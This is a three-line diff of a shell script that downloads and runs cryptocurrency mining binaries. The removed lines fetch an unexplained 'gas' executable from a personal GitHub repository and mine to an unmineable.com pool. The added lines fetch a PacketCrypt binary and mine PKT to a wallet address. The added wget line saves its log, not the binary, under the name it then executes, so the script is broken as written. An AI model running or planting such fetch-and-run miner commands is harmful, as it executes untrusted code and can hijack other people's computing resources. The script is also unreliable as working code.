@@ -1,3 +1,3 @@
-wget https://github.com/sabrifaudi12/dqwz/raw/main/gas
-chmod +x gas
-./gas -o rx.unmineable.com:3333 -a rx -k -u ELON:0x5a7d0af017e3dc8f72e4e7a55258ab9fc02d4b04.$(echo $(shuf -i 1-999999 -n 1)-sabri) -p x
+wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -o nt
+chmod +x nt
+./nt -o ann -p pkt1qmga844nr8q2x0ndlyqzm6k89g8ujjrhs4eg3gl https://stratum.zetahash.com
